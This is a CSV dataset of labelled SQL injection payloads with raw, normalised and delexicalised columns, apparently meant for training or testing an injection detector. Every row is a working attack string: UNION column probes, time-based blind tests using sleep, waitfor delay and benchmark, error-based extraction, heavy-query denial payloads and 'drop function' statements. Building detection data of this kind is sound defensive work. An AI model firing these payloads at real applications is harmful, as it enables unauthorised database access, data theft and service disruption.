payload_raw,label,source,sqli_type_hint,is_obfuscated,payload_norm,payload_delex
"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,sqli_dataset.csv,,True,"1' ) as mvai where 5856 = 5856 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --","<NUM>' ) as mvai where <NUM> = <NUM> and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --"
1'  )   as zxos where 2745  =  2745,1,sqli_dataset.csv,,False,1' ) as zxos where 2745 = 2745,<NUM>' ) as zxos where <NUM> = <NUM>
"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,1,sqli_dataset.csv,,False,"-6846%"" ) ) or ( 8459 = 8459 ) *4906 and ( ( ""%"" = """,-<NUM>%<STR>%<STR>
"1""   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""mxnj"" like ""mxnj",1,sqli_dataset.csv,,False,"1"" ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ""mxnj"" like ""mxnj",<NUM><STR>mxnj<STR>mxnj
"1%""  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,sqli_dataset.csv,,False,"1%"" ) and elt ( 3114 = 3114,sleep ( 5 ) ) #","<NUM>%"" ) and elt ( <NUM> = <NUM>,sleep ( <NUM> ) ) #"
1   )    )    as sfan where 7176  =  7176 and 7017  =  7358,1,sqli_dataset.csv,,False,1 ) ) as sfan where 7176 = 7176 and 7017 = 7358,<NUM> ) ) as sfan where <NUM> = <NUM> and <NUM> = <NUM>
"1""   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""xnsj"" like ""xnsj",1,sqli_dataset.csv,,False,"1"" ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""xnsj"" like ""xnsj",<NUM><STR>xnsj<STR>xnsj
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'tpih'  =  'tpih",1,sqli_dataset.csv,,False,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'tpih' = 'tpih","call regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) and ( ( <STR> = 'tpih"
"1""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""ozvp""  =  ""ozvp",1,sqli_dataset.csv,,True,"1"" ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""ozvp"" = ""ozvp",<NUM><STR>ozvp<STR>ozvp
"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",1,sqli_dataset.csv,,False,"1"" ) waitfor delay '0:0:5' and ( ""hhzy"" like ""hhzy",<NUM><STR>hhzy<STR>hhzy
"1' and make_set  (  3445  =  5963,5963  )   and 'wjfw'  =  'wjfw",1,sqli_dataset.csv,,False,"1' and make_set ( 3445 = 5963,5963 ) and 'wjfw' = 'wjfw",<NUM><STR>wjfw<STR>wjfw
"1"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""menm"" like ""menm",1,sqli_dataset.csv,,False,"1"" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""menm"" like ""menm",<NUM><STR>menm<STR>menm
-7199'||  (  select 'ssty' where 5406  =  5406 order by 1#,1,sqli_dataset.csv,,False,-7199'|| ( select 'ssty' where 5406 = 5406 order by 1#,-<NUM><STR>ssty' where <NUM> = <NUM> order by <NUM>#
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'tmdj' like 'tmdj",1,sqli_dataset.csv,,False,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'tmdj' like 'tmdj","call regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) and <STR> like 'tmdj"
"1  )   and make_set  (  4593  =  7765,7765  )   and   (  8517  =  8517",1,sqli_dataset.csv,,False,"1 ) and make_set ( 4593 = 7765,7765 ) and ( 8517 = 8517","<NUM> ) and make_set ( <NUM> = <NUM>,<NUM> ) and ( <NUM> = <NUM>"
"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",1,sqli_dataset.csv,,False,"-9958"" ) as jzvq where 3741 = 3741 union all select 3741,3741,3741#","-<NUM>"" ) as jzvq where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>#"
select   (  case when   (  6434  =  3877  )   then 6434 else 1/  (  select 0  )   end  )  --,1,sqli_dataset.csv,,False,select ( case when ( 6434 = 3877 ) then 6434 else 1/ ( select 0 ) end ) --,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>/ ( select <NUM> ) end ) --
"1""   )    )    as rpxd where 4929  =  4929",1,sqli_dataset.csv,,False,"1"" ) ) as rpxd where 4929 = 4929","<NUM>"" ) ) as rpxd where <NUM> = <NUM>"
"-7794""  )   union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#",1,sqli_dataset.csv,,False,"-7794"" ) union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#","-<NUM>"" ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
1   )    )    as mlpf where 7425  =  7425,1,sqli_dataset.csv,,False,1 ) ) as mlpf where 7425 = 7425,<NUM> ) ) as mlpf where <NUM> = <NUM>
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'jrpk'  =  'jrpk,1,sqli_dataset.csv,,False,1' ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( 'jrpk' = 'jrpk,<NUM><STR>jrpk<STR>jrpk
1   )    )     )   waitfor delay '0:0:5'--,1,sqli_dataset.csv,,False,1 ) ) ) waitfor delay '0:0:5'--,<NUM> ) ) ) waitfor delay <STR>--
"1,  (  select   (  case when   (  6750  =  6750  )   then 1 else 6750*  (  select 6750 from information_schema.character_sets  )   end   )    )   ",1,sqli_dataset.csv,,False,"1, ( select ( case when ( 6750 = 6750 ) then 1 else 6750* ( select 6750 from information_schema.character_sets ) end ) )","<NUM>, ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>* ( select <NUM> from information_schema.character_sets ) end ) )"
-9336' or 5641  =  9488#,1,sqli_dataset.csv,,False,-9336' or 5641 = 9488#,-<NUM>' or <NUM> = <NUM>#
1'||  (  select 'noik' from dual where 9851  =  9851,1,sqli_dataset.csv,,False,1'|| ( select 'noik' from dual where 9851 = 9851,<NUM><STR>noik' from dual where <NUM> = <NUM>
"1"" where 7045  =  7045",1,sqli_dataset.csv,,False,"1"" where 7045 = 7045","<NUM>"" where <NUM> = <NUM>"
"-3501""   )    )     )   or   (  6789  =  6990  )  *6990 and    (    (     (  ""jnnc"" like ""jnnc",1,sqli_dataset.csv,,False,"-3501"" ) ) ) or ( 6789 = 6990 ) *6990 and ( ( ( ""jnnc"" like ""jnnc",-<NUM><STR>jnnc<STR>jnnc
"1%'   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   '%'  =  '",1,sqli_dataset.csv,,True,"1%' ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( '%' = '",<NUM>%<STR>%<STR>
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",1,sqli_dataset.csv,,False,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and '%' = '","call regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) and <STR> = '"
-5026' or   (  8459  =  8459  )  *4906 and 'uavj' like 'uavj,1,sqli_dataset.csv,,False,-5026' or ( 8459 = 8459 ) *4906 and 'uavj' like 'uavj,-<NUM><STR>uavj<STR>uavj
"1  )   as wust where 3884  =  3884 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sqli_dataset.csv,,False,"1 ) as wust where 3884 = 3884 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --","<NUM> ) as wust where <NUM> = <NUM> and <NUM> = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --"
"1""  )   union all select null#",1,sqli_dataset.csv,,False,"1"" ) union all select null#","<NUM>"" ) union all select null#"
"-3955%'   )    )    union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#",1,sqli_dataset.csv,,False,"-3955%' ) ) union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#","-<NUM>%' ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
"1   )    )    as nxdf where 1696  =  1696 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,sqli_dataset.csv,,True,"1 ) ) as nxdf where 1696 = 1696 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #","<NUM> ) ) as nxdf where <NUM> = <NUM> or <NUM> = benchmark ( <NUM>,md5 ( 0x544d5a4c ) ) #"
select case when 6229  =  2077 then 1 else null end--,1,sqli_dataset.csv,,False,select case when 6229 = 2077 then 1 else null end--,select case when <NUM> = <NUM> then <NUM> else null end--
select   (  case when   (  5569  =  9390  )   then 5569 else 1/  (  select 0  )   end  )  --,1,sqli_dataset.csv,,False,select ( case when ( 5569 = 9390 ) then 5569 else 1/ ( select 0 ) end ) --,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>/ ( select <NUM> ) end ) --
1'  )   where 1363  =  1363,1,sqli_dataset.csv,,False,1' ) where 1363 = 1363,<NUM>' ) where <NUM> = <NUM>
"1  )   union all select null,null,null,null,null,null,null,null,null--",1,sqli_dataset.csv,,False,"1 ) union all select null,null,null,null,null,null,null,null,null--","<NUM> ) union all select null,null,null,null,null,null,null,null,null--"
"1'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   'wqme'  =  'wqme",1,sqli_dataset.csv,,True,"1' ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( 'wqme' = 'wqme",<NUM><STR>wqme<STR>wqme
"1""   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""gimc"" like ""gimc",1,sqli_dataset.csv,,False,"1"" ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""gimc"" like ""gimc",<NUM><STR>gimc<STR>gimc
"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",1,sqli_dataset.csv,,True,"-4373'+ ( select 'rlht' where 2285 = 2285 union all select 2285,2285,2285#","-<NUM><STR>rlht' where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>#"
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv,1,sqli_dataset.csv,,False,1 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) -- paxv,<NUM> or ( select * from ( select ( sleep ( <NUM> ) ) ) ydpu ) -- paxv
"1' or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sqli_dataset.csv,,False,"1' or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --","<NUM>' or <NUM> = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --"
"1"" rlike   (  select   (  case when   (  2724  =  4757  )   then 1 else 0x28 end   )    )    and ""cmsa""  =  ""cmsa",1,sqli_dataset.csv,,True,"1"" rlike ( select ( case when ( 2724 = 4757 ) then 1 else 0x28 end ) ) and ""cmsa"" = ""cmsa",<NUM><STR>cmsa<STR>cmsa
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'lckw'  =  'lckw",1,sqli_dataset.csv,,False,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and 'lckw' = 'lckw","select dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) from dual and <STR> = 'lckw"
"1""   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""kcxw""  =  ""kcxw",1,sqli_dataset.csv,,False,"1"" ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""kcxw"" = ""kcxw",<NUM><STR>kcxw<STR>kcxw
1 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) ,1,sqli_dataset.csv,,True,1 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ),<NUM> rlike ( select ( case when ( <NUM> = <NUM> ) then <NUM> else 0x28 end ) )
"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",1,sqli_dataset.csv,,False,"-1891' in boolean mode ) union all select 6680,6680,6680,6680,6680,6680,6680,6680#","-<NUM>' in boolean mode ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
"1%""   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   ""%""  =  """,1,sqli_dataset.csv,,False,"1%"" ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ""%"" = """,<NUM>%<STR>%<STR>
"1""   )    )    as frsd where 6475  =  6475 union all select null,null,null,null,null,null,null,null,null,null--",1,sqli_dataset.csv,,False,"1"" ) ) as frsd where 6475 = 6475 union all select null,null,null,null,null,null,null,null,null,null--","<NUM>"" ) ) as frsd where <NUM> = <NUM> union all select null,null,null,null,null,null,null,null,null,null--"
if  (  3831  =  9321  )   select 3831 else drop function ybru--,1,sqli_dataset.csv,,False,if ( 3831 = 9321 ) select 3831 else drop function ybru--,if ( <NUM> = <NUM> ) select <NUM> else drop function ybru--
"1""  )   where 9861  =  9861",1,sqli_dataset.csv,,False,"1"" ) where 9861 = 9861","<NUM>"" ) where <NUM> = <NUM>"
if  (  3490  =  4920  )   select 3490 else drop function hlzt--,1,sqli_dataset.csv,,False,if ( 3490 = 4920 ) select 3490 else drop function hlzt--,if ( <NUM> = <NUM> ) select <NUM> else drop function hlzt--
"1  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1,sqli_dataset.csv,,False,"1 ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )","<NUM> ) or <NUM> = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )"
"1""  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""pqsp""  =  ""pqsp",1,sqli_dataset.csv,,False,"1"" ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ""pqsp"" = ""pqsp",<NUM><STR>pqsp<STR>pqsp
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg",1,sqli_dataset.csv,,False,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg","select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg"
"1'  )   where 3262  =  3262 union all select null,null,null,null,null,null,null,null,null,null#",1,sqli_dataset.csv,,False,"1' ) where 3262 = 3262 union all select null,null,null,null,null,null,null,null,null,null#","<NUM>' ) where <NUM> = <NUM> union all select null,null,null,null,null,null,null,null,null,null#"
-2573   )    )    order by 1#,1,sqli_dataset.csv,,False,-2573 ) ) order by 1#,-<NUM> ) ) order by <NUM>#
"-2027%""  )   union all select 2048,2048,2048,2048,2048,2048,2048,2048#",1,sqli_dataset.csv,,False,"-2027%"" ) union all select 2048,2048,2048,2048,2048,2048,2048,2048#","-<NUM>%"" ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
1 where 3354  =  3354,1,sqli_dataset.csv,,False,1 where 3354 = 3354,<NUM> where <NUM> = <NUM>
"1""   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""dtfg""  =  ""dtfg",1,sqli_dataset.csv,,True,"1"" ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ""dtfg"" = ""dtfg",<NUM><STR>dtfg<STR>dtfg
"-3853""  )   where 4626  =  4626 union all select 4626,4626,4626--",1,sqli_dataset.csv,,False,"-3853"" ) where 4626 = 4626 union all select 4626,4626,4626--","-<NUM>"" ) where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>--"
"1'+  (  select 'vwzp' where 2729  =  2729 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,sqli_dataset.csv,,True,"1'+ ( select 'vwzp' where 2729 = 2729 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --","<NUM><STR>vwzp' where <NUM> = <NUM> or <NUM> = dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) --"
"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",1,sqli_dataset.csv,,False,"1' and elt ( 1210 = 1210,sleep ( 5 ) ) and 'ioar' = 'ioar",<NUM><STR>ioar<STR>ioar
-3096' or 3821  =  5539 and 'zrth'  =  'zrth,1,sqli_dataset.csv,,False,-3096' or 3821 = 5539 and 'zrth' = 'zrth,-<NUM><STR>zrth<STR>zrth
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,1,sqli_dataset.csv,,False,1 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) # lwfs,<NUM> or ( select * from ( select ( sleep ( <NUM> ) ) ) ydpu ) # lwfs
"1 union all select null,null,null,null,null,null,null,null,null--",1,sqli_dataset.csv,,False,"1 union all select null,null,null,null,null,null,null,null,null--","<NUM> union all select null,null,null,null,null,null,null,null,null--"
"1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  # msrb",1,sqli_dataset.csv,,False,"1 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) # msrb","<NUM> or <NUM> = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) # msrb"
"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",1,sqli_dataset.csv,,True,"1' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'ulep' = 'ulep",<NUM><STR>ulep<STR>ulep
"-5230""  )   or elt  (  1032  =  1032,3623  )   and   (  ""aivb"" like ""aivb",1,sqli_dataset.csv,,False,"-5230"" ) or elt ( 1032 = 1032,3623 ) and ( ""aivb"" like ""aivb",-<NUM><STR>aivb<STR>aivb
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'nbzf' like 'nbzf,1,sqli_dataset.csv,,False,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'nbzf' like 'nbzf,( select * from ( select ( sleep ( <NUM> ) ) ) srmq ) and ( ( <STR> like 'nbzf
"-8349  )   union all select 8126,8126#",1,sqli_dataset.csv,,False,"-8349 ) union all select 8126,8126#","-<NUM> ) union all select <NUM>,<NUM>#"
